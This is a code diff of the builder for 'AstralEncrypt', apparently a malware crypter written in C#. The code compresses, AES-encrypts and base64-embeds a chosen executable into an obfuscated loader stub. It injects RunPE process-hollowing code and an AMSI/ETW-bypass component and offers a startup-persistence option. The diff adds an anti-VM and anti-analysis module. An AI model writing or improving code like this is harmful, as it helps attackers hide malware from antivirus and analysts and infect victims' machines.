@@ -30,11 +30,6 @@ namespace AstralEncrypt
             }
         }
 
-        private void guna2Button_hide_Click(object sender, EventArgs e)
-        {
-            WindowState = FormWindowState.Minimized;
-        }
-
         private void guna2Button_exit_Click(object sender, EventArgs e)
         {
             Environment.Exit(0);
@@ -57,12 +52,7 @@ namespace AstralEncrypt
             }
         }
 
-        private void guna2GradientButton_password_Click(object sender, EventArgs e)
-        {
-            guna2TextBox_password_stub.Text = RandomString.RandomStringGenerator.Generate(256);
-        }
-
-        public void WhileGenerateKey()
+        private void WhileGenerateKey()
         {
             while (true)
             {
@@ -73,11 +63,10 @@ namespace AstralEncrypt
         private void guna2GradientButton_encrypt_Click(object sender, EventArgs e)
         {
             string filenameExe = RandomString.RandomStringGenerator.Generate(5) + ".exe";
-            string stub = Deplacer.CopyLireStub();
-            string loaderStub = Deplacer.CopyLireLoaderStub();
+            string stub = Deplacer.CopyLireStubLoaderStub("Stub.txt");
+            string loaderStub = Deplacer.CopyLireStubLoaderStub("LoaderStub.txt");
             string password = guna2TextBox_password_stub.Text;
             string fullPathFileName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + filenameExe;
-
             byte[] payloadFileLoadEncComp =
                 Encryptions.AES_Encrypt(Encryptions.Compress(File.ReadAllBytes(guna2TextBox_filename.Text)), password);
             string base64PayloadEncComp = Convert.ToBase64String(payloadFileLoadEncComp);
@@ -93,10 +82,10 @@ namespace AstralEncrypt
                 loaderStub = ReplaceLoaderStub(loaderStub, fullPathFileName);
 
                 Obfuscation.ObfuscateStub(loaderStub, fullPathFileName, guna2TextBox1_icon.Text);
-                MessageBox.Show(@"Done !,Save in : " + fullPathFileName , @"by amn...",
+                MessageBox.Show(@"Done !,Save in : " + fullPathFileName, @"by amn...",
                     MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 MessageBox.Show(@"Erreur : la compilations a echouee : " + ex.Message + ex.InnerException, @"by amn...",
                     MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -110,7 +99,7 @@ namespace AstralEncrypt
             //Amsi
             string passwordAmsi = guna2TextBox_password_stub.Text;
             string filenameAmsiEtw = "AmsiEtw.exe";
-            Obfuscation.ObfuscateExe(Deplacer.CopyLireAmsiEtw(), filenameAmsiEtw);
+            Obfuscation.ObfuscateExe(Deplacer.CopyLireComposants(filenameAmsiEtw), filenameAmsiEtw);
             byte[] amsiEtwEncComp =
                 Encryptions.AES_Encrypt(Encryptions.Compress(File.ReadAllBytes(filenameAmsiEtw)), passwordAmsi);
             string base64AmsiEtw = Convert.ToBase64String(amsiEtwEncComp);
@@ -124,7 +113,7 @@ namespace AstralEncrypt
         private string ReplaceLoaderStub(string loaderstub, string fullPathFileName)
         {
             loaderstub = Assembly(loaderstub);
-            
+
             byte[] stubBytes = File.ReadAllBytes(fullPathFileName);
             if (File.Exists(fullPathFileName))
                 File.Delete(fullPathFileName);
@@ -134,13 +123,29 @@ namespace AstralEncrypt
 
             loaderstub = loaderstub.Replace("#STUB_LOAD_BASE64#", base64StubBytesEncComp);
             loaderstub = loaderstub.Replace("#PASSWORD_LOAD_BASE64#", passwordStubBytes);
-            
+
             loaderstub = Injection(loaderstub);
             loaderstub = LoadRunPeInStub(loaderstub);
             if (guna2CheckBox_startup.Checked)
             {
                 loaderstub = loaderstub.Replace("#STARTUP_FALSE#", "#STARTUP_TRUE#");
             }
+
+            if (guna2CheckBox1_anti_vm.Checked)
+            {
+                loaderstub = loaderstub.Replace("#ANTI_FALSE#", "#ANTI_TRUE#");
+                string filenameAntiVm = "Anti_Analysis.exe";
+                Obfuscation.ObfuscateExe(Deplacer.CopyLireComposants(filenameAntiVm),filenameAntiVm);
+                string passwordAntiAnalysis = guna2TextBox_password_stub.Text;
+                byte[] antiAnalysis =
+                    Encryptions.AES_Encrypt(Encryptions.Compress(File.ReadAllBytes(filenameAntiVm)),passwordAntiAnalysis);
+                string base64AntiAnalysis = Convert.ToBase64String(antiAnalysis);
+
+                loaderstub = loaderstub.Replace("#BASE64_ANTI_ANALYSIS#", base64AntiAnalysis);
+                loaderstub = loaderstub.Replace("#PASSWORD_ANTI_ANALYSIS#", passwordAntiAnalysis);
+
+            }
+
             return loaderstub;
         }
 
@@ -149,7 +154,7 @@ namespace AstralEncrypt
             string fileNameRunPe = "RunPE.dll";
             string passwordRunPeBytes = guna2TextBox_password_stub.Text;
             byte[] stubBytesEncComp = Encryptions.AES_Encrypt(
-                Encryptions.Compress(Obfuscation.Obfuscate_dll(Deplacer.CopyLireRunPE(), fileNameRunPe)),
+                Encryptions.Compress(Obfuscation.Obfuscate_dll(Deplacer.CopyLireComposants(fileNameRunPe), fileNameRunPe)),
                 passwordRunPeBytes);
             string base64RunPe = Convert.ToBase64String(stubBytesEncComp);
             loaderStub = loaderStub.Replace("#RUNPE#", base64RunPe);
